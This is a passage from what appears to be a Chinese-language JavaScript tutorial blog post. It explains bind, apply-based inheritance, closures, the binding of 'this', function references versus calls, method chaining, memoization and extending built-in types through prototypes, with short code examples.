<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.bind = <span class="function"><span class="keyword">function</span>(<span class="params">context</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> self = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> self.apply(context,<span class="built_in">arguments</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> yunxi = &#123;</span><br><span class="line">    name: <span class="string">'yunxi'</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> func = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.name); <span class="comment">// yunxi</span></span><br><span class="line">&#125;.bind(yunxi);</span><br><span class="line"></span><br><span class="line">func();</span><br></pre></td></tr></table></figure>
<p>如上代码所示：<code>func</code>这个函数使用调用<code>bind</code>这个方法，并且把对象<code>yunxi</code>作为参数传进去，然后bind函数使用return返回一个函数，当我们调用func()执行这个方法的时候，其实我们就是在调用<code>bind</code>方法内的<code>return</code>返回的那个函数，在返回的那个函数内<code>context</code>的上下文其实就是我们以参数yunxi对象传进去的，因此<code>this</code>指针指向与<code>yunxi</code>这个对象了~ 所以打印出<code>this.name</code> 就是<code>yunxi</code>那个对象的<code>name</code>了;</p>
<p>除了上面我们看到的介绍<code>apply</code>或者<code>call</code>方法可以改变<code>this</code>指针外，我们还可以使用<code>call</code>或者<code>apply</code>来继承对象的方法；实质也就是改变<code>this</code>的指针了；</p>
<p>比如有如下代码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> Yunxi = <span class="function"><span class="keyword">function</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Longen = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    Yunxi.apply(<span class="keyword">this</span>,<span class="built_in">arguments</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Longen.prototype.getName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> longen = <span class="keyword">new</span> Longen(<span class="string">"tugenhua"</span>);</span><br><span class="line"><span class="built_in">console</span>.log(longen.getName());  <span class="comment">// 打印出tugenhua</span></span><br></pre></td></tr></table></figure>
<p>如上代码：我先实例化<code>Longen</code>这个对象，把参数传进去，之后使用<code>Yunxi.apply(this,arguments)</code>这句代码来改变<code>Longen</code>这个对象的<code>this</code>的指针，使他指向了<code>Yunxi</code>这个对象，因此<code>Yunxi</code>这个对象保存了<code>longen</code>这个实例化对象的参数<code>tugenhua</code>，因此当我们调用<code>longen.getName</code>这个方法的时候，我们返回<code>this.name</code>，即我们可以认为返回的是 <code>Yunxi.name</code> 因此返回的是 <code>tugenhua</code>，我们只是借用了下<code>Yunxi</code>这个对象内的<code>this.name</code>来保存<code>Longen</code>传进去的参数而已；</p>
<h3 id="二：闭包的理解"><a href="#二：闭包的理解" class="headerlink" title="二：闭包的理解"></a>二：闭包的理解</h3><p>闭包的结构有如下2个特性</p>
<ol>
<li><p>封闭性：外界无法访问闭包内部的数据，如果在闭包内声明变量，外界是无法访问的，除非闭包主动向外界提供访问接口；</p>
</li>
<li><p>持久性：一般的函数，调用完毕之后，系统自动注销函数，而对于闭包来说，在外部函数被调用之后，闭包结构依然保存在</p>
</li>
</ol>
<p>系统中，闭包中的数据依然存在，从而实现对数据的持久使用。</p>
<p>缺点：</p>
<p>使用闭包会占有内存资源，过多的使用闭包会导致内存溢出等.</p>
<p>如下代码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a = x;</span><br><span class="line">    <span class="keyword">var</span> b = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> b = a(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">console</span>.log(b()); <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
<p>首先在<code>a</code>函数内定义了2个变量，1个是存储参数，另外一个是闭包结构，在闭包结构中保存着<code>b</code>函数内的<code>a</code>变量，默认情况下，当<code>a</code>函数调用完之后<code>a</code>变量会自动销毁的，但是由于闭包的影响，闭包中使用了外界的变量，因此<code>a</code>变量会一直保存在内存当中，因此变量<code>a</code>参数没有随着<code>a</code>函数销毁而被释放，因此引申出闭包的缺点是：过多的使用闭包会占有内存资源，或内存溢出等肯能性；</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 经典的闭包实列如下：</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">x</span>)</span>&#123;              <span class="comment">//外部函数</span></span><br><span class="line">    <span class="keyword">var</span> a = x;              <span class="comment">// 外部函数的局部变量，并传递参数</span></span><br><span class="line">    <span class="keyword">var</span> b = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;     <span class="comment">// 内部函数</span></span><br><span class="line">        <span class="keyword">return</span> a;           <span class="comment">// 访问外部函数中的局部变量</span></span><br><span class="line">    &#125;;</span><br><span class="line">    a++;                    <span class="comment">// 访问后，动态更新外部函数的变量</span></span><br><span class="line">    <span class="keyword">return</span> b;               <span class="comment">// 返回内部函数</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> c = f(<span class="number">5</span>);               <span class="comment">// 调用外部函数并且赋值</span></span><br><span class="line"><span class="built_in">console</span>.log(c());           <span class="comment">// 调用内部函数，返回外部函数更新后的值为6</span></span><br></pre></td></tr></table></figure>
<p>下面我们来看看如下使用闭包的列子</p>
<p>在如下代码中有2个函数，<code>f</code>函数的功能是：把数组类型的参数中每个元素的值分别封装在闭包结构中，然后把闭包存储在一个数组中，并返回这个数组，但是在函数e中调用函数f并向其传递一个数组<code>[&quot;a&quot;,&quot;b&quot;,&quot;c&quot;]</code>,然后遍历返回函数f返回数组，我们运行打印后发现都是<code>c undefined</code>，那是因为在执行f函数中的循环时候，把值虽然保存在<code>temp</code>中，但是每次循环后<code>temp</code>值在不断的变化，当<code>for</code>循环结束后，此时<code>temp</code>值为<code>c</code>，同时<code>i</code>变为3，因此当调用的时候 打印出来的是<code>temp</code>为3，<code>arrs[3</code>]变为<code>undefined</code>；因此打印出 <code>c undefined</code></p>
<p>解决闭包的缺陷我们可以再在外面包一层函数，每次循环的时候，把<code>temp</code>参数和i参数传递进去 如代码二</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 代码一</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> arrs = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; x.length; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> temp = x[i];</span><br><span class="line">        arrs.push(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(temp + <span class="string">' '</span> +x[i]); <span class="comment">// c undefined</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arrs;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">e</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> ar = f([<span class="string">"a"</span>,<span class="string">"b"</span>,<span class="string">"c"</span>]);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>,ilen = ar.length; i &lt; ilen; i++) &#123;</span><br><span class="line">        ar[i]();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">e();</span><br><span class="line"><span class="comment">// 代码二：</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> arrs = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; x.length; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> temp = x[i];</span><br><span class="line">        (<span class="function"><span class="keyword">function</span>(<span class="params">temp,i</span>)</span>&#123;</span><br><span class="line">            arrs.push(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(temp + <span class="string">' '</span> +x[i]); <span class="comment">// c undefined</span></span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;)(temp,i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arrs;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">e2</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> ar = f2([<span class="string">"a"</span>,<span class="string">"b"</span>,<span class="string">"c"</span>]);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>,ilen = ar.length; i &lt; ilen; i++) &#123;</span><br><span class="line">        ar[i]();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">e2();</span><br></pre></td></tr></table></figure>
<h3 id="三：javascript中的this详解"><a href="#三：javascript中的this详解" class="headerlink" title="三：javascript中的this详解"></a>三：javascript中的this详解</h3><p><code>this</code>的指向常见的有如下几点需要常用到：</p>
<ul>
<li>全局对象的<code>this</code>是指向与window；</li>
<li>作为普通函数调用。</li>
<li>作为对象方法调用。</li>
<li>构造器调用。</li>
<li><code>Function.prototype.call</code> 或 <code>Function.prototype.apply</code>调用。</li>
</ul>
<p>下面我们分别来介绍一下：</p>
<h4 id="1-全局对象的this；"><a href="#1-全局对象的this；" class="headerlink" title="1. 全局对象的this；"></a>1. 全局对象的<code>this</code>；</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="keyword">this</span>); <span class="comment">// this指向于window</span></span><br><span class="line">setTimeout() 和 setInterval()函数内部的<span class="keyword">this</span>指针是指向于<span class="built_in">window</span>的，如下代码：</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="number">11</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span> === <span class="built_in">window</span>); <span class="comment">// true</span></span><br><span class="line">    <span class="keyword">this</span>.test(); <span class="comment">// 11</span></span><br><span class="line"> &#125;);</span><br></pre></td></tr></table></figure>
<h4 id="2-作为普通函数调用；"><a href="#2-作为普通函数调用；" class="headerlink" title="2. 作为普通函数调用；"></a>2. 作为普通函数调用；</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> name = <span class="string">"longen"</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(test()); <span class="comment">// longen</span></span><br></pre></td></tr></table></figure>
<p class="tip">当作为普通函数调用时候，<code>this</code>总是指向了全局对象，在浏览器当中，全局对象一般指的是<code>window</code>；</p>

<h4 id="3-作为对象的方法调用。"><a href="#3-作为对象的方法调用。" class="headerlink" title="3. 作为对象的方法调用。"></a>3. 作为对象的方法调用。</h4><p>如下代码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">    <span class="string">"name"</span>: <span class="string">"我的花名改为云溪了，就是为了好玩"</span>,</span><br><span class="line">    getName: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="keyword">this</span>); <span class="comment">// 在这里this指向于obj对象了</span></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="keyword">this</span>.name); <span class="comment">// 打印 我的花名改为云溪了，就是为了好玩</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">obj.getName(); <span class="comment">// 对象方法调用</span></span><br></pre></td></tr></table></figure>
<p>但是呢，我们不能像如下一样调用对象了，如下调用对象的话，<code>this</code>还是执行了<code>window</code>，如下代码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> name = <span class="string">"全局对象名字"</span>;</span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">    <span class="string">"name"</span>: <span class="string">"我的花名改为云溪了，就是为了好玩"</span>,</span><br><span class="line">    getName: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="keyword">this</span>);  <span class="comment">// window</span></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="keyword">this</span>.name); <span class="comment">// 全局对象名字</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> yunxi = obj.getName;</span><br><span class="line">yunxi();</span><br></pre></td></tr></table></figure>
<p>运行<code>yunxi()</code>函数，还是会像调用普通函数一样，<code>this</code>指向了<code>window</code>的；</p>
<h4 id="4-构造器调用。"><a href="#4-构造器调用。" class="headerlink" title="4. 构造器调用。"></a>4. 构造器调用。</h4><p>Javascript中不像Java一样，有类的概念，而JS中只能通过构造器创建对象，通过<code>new</code> 对象，当<code>new</code>运算符调用函数时候，该函数会返回一个对象，一般情况下，构造器里面的this就是指向返回的这个对象；</p>
<p>如下代码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> Obj = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = <span class="string">"yunxi"</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> test = <span class="keyword">new</span> Obj();</span><br><span class="line"><span class="built_in">console</span>.log(test.name); <span class="comment">// yunxi</span></span><br></pre></td></tr></table></figure>
<p>注意：构造器函数第一个字母需要大写，这是为了区分普通函数还是构造器函数而言；</p>
<p>如上代码：通过调用 <code>new Obj()</code>方法 返回值保存到<code>test</code>变量中，那么<code>test</code>就是那个对象了，所以内部的<code>this</code>就指向与test对象了，因此<code>test.name</code>就引用到了内部的<code>this.name</code> 即输出 <code>“yunxi”</code>字符串；</p>
<p>但是也有例外的情况，比如构造器显示地返回了一个对象的话，那么这次继续调用的话，那么会最终会返回这个对象，比如如下代码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = <span class="string">"yunxi"</span>;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="string">"age"</span>: <span class="string">"27"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> test = <span class="keyword">new</span> obj();</span><br><span class="line"><span class="built_in">console</span>.log(test.name); <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure>
<p>那么继续调用的话，会返回<code>unedfined</code>，因为返回的是那个对象，对象里面没有name这个属性，因此值为<code>undefined</code>；</p>
<h3 id="四：理解函数引用和函数调用的区别"><a href="#四：理解函数引用和函数调用的区别" class="headerlink" title="四：理解函数引用和函数调用的区别"></a>四：理解函数引用和函数调用的区别</h3><p>看下面的代码分析:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 函数引用 代码一</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> x = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> a = f;</span><br><span class="line"><span class="keyword">var</span> b = f;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(a===b); <span class="comment">// true</span></span><br><span class="line"><span class="comment">// 函数调用 代码二</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> x = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> a2 = f2();</span><br><span class="line"><span class="keyword">var</span> b2 = f2();</span><br><span class="line"><span class="built_in">console</span>.log(a2 === b2);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数调用 代码三</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f3</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> x = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> a3 = f3();</span><br><span class="line"><span class="keyword">var</span> b3 = f3();</span><br><span class="line"><span class="built_in">console</span>.log(a3 === b3); <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<p>如上的代码：代码一和代码二分部是函数引用和函数调用的列子，返回都为<code>true</code>，代码三也是函数调用的列子，返回且为<code>false</code></p>
<p>我们现在来理解下函数引用和函数调用的本质区别：当引用函数时候，多个变量内存存储的是函数的相同的入口指针，因此对于同一个函数来讲，无论多少个变量引用，他们都是相等的，因为对于引用类型(对象，数组，函数等)都是比较的是内存地址，如果他们内存地址一样的话，说明是相同的；但是对于函数调用来讲，比如代码三;每次调用的时候，都被分配一个新的内存地址，所以他们的内存地址不相同，因此他们会返回<code>false</code>，但是对于代码二来讲，我们看到他们没有返回函数，只是返回数值，他们比较的不是内存地址，而是比较值，所以他们的值相等，因此他们也返回<code>true</code>，我们也可以看看如下实列化一个对象的列子，他们也被分配到不同的内存地址，因此他们也是返回<code>false</code>的；如下代码测试：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">F</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.x = <span class="number">5</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> F();</span><br><span class="line"><span class="keyword">var</span> b = <span class="keyword">new</span> F();</span><br><span class="line"><span class="built_in">console</span>.log(a === b); <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<h3 id="五：理解js中的链式调用"><a href="#五：理解js中的链式调用" class="headerlink" title="五：理解js中的链式调用"></a>五：理解js中的链式调用</h3><p>我们使用jquery的时候，jquery的简单的语法及可实现链式调用方法，现在我们自己也封装一个链式调用的方法，来理解下 jquery中如何封装链式调用 无非就是每次调用一个方法的时候 给这个方法返回this即可，this指向该对象自身，我们看看代码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义一个简单的对象，每次调用对象的方法的时候，该方法都返回该对象自身</span></span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">    a: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"输出a"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">    b:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"输出b"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(obj.a().b()); <span class="comment">// 输出a 输出b 输出this指向与obj这个对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 下面我们再看下 上面的通过Function扩展类型添加方法的demo如下：</span></span><br><span class="line"><span class="built_in">Function</span>.prototype.method = <span class="function"><span class="keyword">function</span>(<span class="params">name,func</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">this</span>.prototype[name]) &#123;</span><br><span class="line">        <span class="keyword">this</span>.prototype[name] = func;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">String</span>.method(<span class="string">'trim'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.replace(<span class="regexp">/^\s+|\s+$/g</span>,<span class="string">''</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">String</span>.method(<span class="string">'log2'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"链式调用"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">String</span>.method(<span class="string">'r'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.replace(<span class="regexp">/a/</span>,<span class="string">''</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">var</span> str = <span class="string">" abc "</span>;</span><br><span class="line"><span class="built_in">console</span>.log(str.trim().log2().r()); <span class="comment">// 输出链式调用和 bc</span></span><br></pre></td></tr></table></figure>
<h3 id="六：理解使用函数实现历史记录–提高性能"><a href="#六：理解使用函数实现历史记录–提高性能" class="headerlink" title="六：理解使用函数实现历史记录–提高性能"></a>六：理解使用函数实现历史记录–提高性能</h3><p>函数可以使用对象去记住先前操作的结果，从而避免多余的运算。比如我们现在测试一个费波纳茨的算法，我们可以使用递归函数计算fibonacci数列，一个fibonacci数字是之前两个fibonacci数字之和，最前面的两个数字是0和1；代码如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> count = <span class="number">0</span>;</span><br><span class="line"> <span class="keyword">var</span> fibonacci = <span class="function"><span class="keyword">function</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">    count++;</span><br><span class="line">    <span class="keyword">return</span> n &lt; <span class="number">2</span> ? n : fibonacci(n<span class="number">-1</span>) + fibonacci(n<span class="number">-2</span>);</span><br><span class="line"> &#125;;</span><br><span class="line"> <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt;= <span class="number">10</span>; i+=<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(i+<span class="string">":"</span>+fibonacci(i));</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="built_in">console</span>.log(count); <span class="comment">// 453</span></span><br></pre></td></tr></table></figure>
<p>我们可以看到如上 fibonacci函数总共调用了453次，for循环了11次，它自身调用了442次，如果我们使用下面的记忆函数的话，那么就可以减少他们的运算次数，从而提高性能；</p>
<p>思路：先使用一个临时数组保存存储结果，当函数被调用的时候，先看是否已经有存储结果 如果有的话，就立即返回这个存储结果，否则的话，调用函数运算下；代码如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> count2 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> fibonacci2 = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> memo = [<span class="number">0</span>,<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">var</span> fib = <span class="function"><span class="keyword">function</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> result = memo[n];</span><br><span class="line">        count2++;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">typeof</span> result !== <span class="string">'number'</span>) &#123;</span><br><span class="line">            result = fib(n<span class="number">-1</span>) + fib(n<span class="number">-2</span>);</span><br><span class="line">            memo[n] = result;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> fib;</span><br><span class="line"> &#125;)();</span><br><span class="line"> <span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">0</span>; j &lt;= <span class="number">10</span>; j+=<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(j+<span class="string">":"</span>+fibonacci2(j));</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="built_in">console</span>.log(count2); <span class="comment">// 29</span></span><br></pre></td></tr></table></figure>
<p>这个函数也返回了同样的结果，但是只调用了函数29次，循环了11次，也就是说函数自身调用了18次，从而减少无谓的函数的调用及运算，下面我们可以把这个函数进行抽象化，以构造带记忆功能的函数，如下代码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> count3 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> memoizer = <span class="function"><span class="keyword">function</span>(<span class="params">memo,formula</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> recur = <span class="function"><span class="keyword">function</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> result = memo[n];</span><br><span class="line">        count3++;   <span class="comment">// 这句代码只是说明运行函数多少次，在代码中并无作用，实际使用上可以删掉</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">typeof</span> result !== <span class="string">'number'</span>) &#123;</span><br><span class="line">            result = formula(recur,n);</span><br><span class="line">            memo[n] = result;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> recur;</span><br><span class="line"> &#125;;</span><br><span class="line"> <span class="keyword">var</span> fibonacci3 = memoizer([<span class="number">0</span>,<span class="number">1</span>],<span class="function"><span class="keyword">function</span>(<span class="params">recur,n</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> recur(n<span class="number">-1</span>) + recur(n<span class="number">-2</span>);</span><br><span class="line"> &#125;);</span><br><span class="line"> <span class="comment">// 调用方式如下</span></span><br><span class="line"> <span class="keyword">for</span>(<span class="keyword">var</span> k = <span class="number">0</span>; k &lt;=<span class="number">10</span>; k+=<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(k+<span class="string">":"</span>+fibonacci3(k));</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="built_in">console</span>.log(count3); <span class="comment">// 29</span></span><br></pre></td></tr></table></figure>
<p>如上封装 memoizer 里面的参数是实现某个方法的计算公式，具体的可以根据需要自己手动更改，这边的思路无非就是想习惯使用对象去保存临时值，从而减少不必要的取值存储值的操作；</p>
<h3 id="七：理解通过Function扩展类型"><a href="#七：理解通过Function扩展类型" class="headerlink" title="七：理解通过Function扩展类型"></a>七：理解通过Function扩展类型</h3><p>javascript 允许为语言的基本数据类型定义方法。通过Object.prototype添加原型方法，该方法可被所有的对象使用。</p>
<p>这对函数，字符串，数字，正则和布尔值都适用，比如如下现在给Function.prototype增加方法，使该方法对所有函数都可用，代码如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.method = <span class="function"><span class="keyword">function</span>(<span class="params">name,func</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">this</span>.prototype[name]) &#123;</span><br><span class="line">        <span class="keyword">this</span>.prototype[name] = func;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Number</span>.method(<span class="string">'integer'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Math</span>[<span class="keyword">this</span> &lt; <span class="number">0</span> ? <span class="string">'ceil'</span> : <span class="string">'floor'</span>](<span class="keyword">this</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log((<span class="number">-10</span>/<span class="number">3</span>).integer()); <span class="comment">// -3</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">String</span>.method(<span class="string">'trim'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.replace(<span class="regexp">/^\s+|\s+$/g</span>,<span class="string">''</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">" abc "</span>.trim()); <span class="comment">// abc</span></span><br></pre></td></tr></table></figure>
